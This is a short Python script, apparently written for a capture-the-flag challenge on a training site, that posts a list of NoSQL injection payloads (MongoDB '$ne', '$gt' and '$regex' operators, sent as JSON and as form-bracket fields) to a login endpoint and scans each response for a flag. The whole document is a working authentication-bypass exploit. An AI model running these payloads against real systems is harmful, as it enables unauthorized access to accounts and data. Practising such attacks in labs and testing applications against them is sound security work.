import sys, requests, urllib3, re, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
tests = [
    ("json ne null", {"json": {"name": {"$ne": None}, "pass": {"$ne": None}}}),
    ("json ne x", {"json": {"name": {"$ne": "x"}, "pass": {"$ne": "x"}}}),
    ("json gt", {"json": {"name": {"$gt": ""}, "pass": {"$gt": ""}}}),
    ("json regex", {"json": {"name": {"$regex": ".*"}, "pass": {"$regex": ".*"}}}),
    ("form bracket", {"data": "name[$ne]=x&pass[$ne]=x"}),
    ("form bracket2", {"data": "name%5B%24ne%5D=x&pass%5B%24ne%5D=x"}),
    ("json admin ne", {"json": {"name": "admin", "pass": {"$ne": "x"}}}),
]
for label, kw in tests:
    try:
        r = requests.post(BASE, timeout=20, **kw)
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
        alerts = re.findall(r"<!-- <strong>Title</strong> -->\s*([^<]{0,120})", r.text)
        print("%-16s -> %d octets | alert=%r %s" % (label, len(r.text),
              (alerts[0].strip()[:80] if alerts else "-"), "FLAG " + m.group(0) if m else ""))
        if m:
            break
    except Exception as e:
        print(label, "ERR", type(e).__name__, e)
